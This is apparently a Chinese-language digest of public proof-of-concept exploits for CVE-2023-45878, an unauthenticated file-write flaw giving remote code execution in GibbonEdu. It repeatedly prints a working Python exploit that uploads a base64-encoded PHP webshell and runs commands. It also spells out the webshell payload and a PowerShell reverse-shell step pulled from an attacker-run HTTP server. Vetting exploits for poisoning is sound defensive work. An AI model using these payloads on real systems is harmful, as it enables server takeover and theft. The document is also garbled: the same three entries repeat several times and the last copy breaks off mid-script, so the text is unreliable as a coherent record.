**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
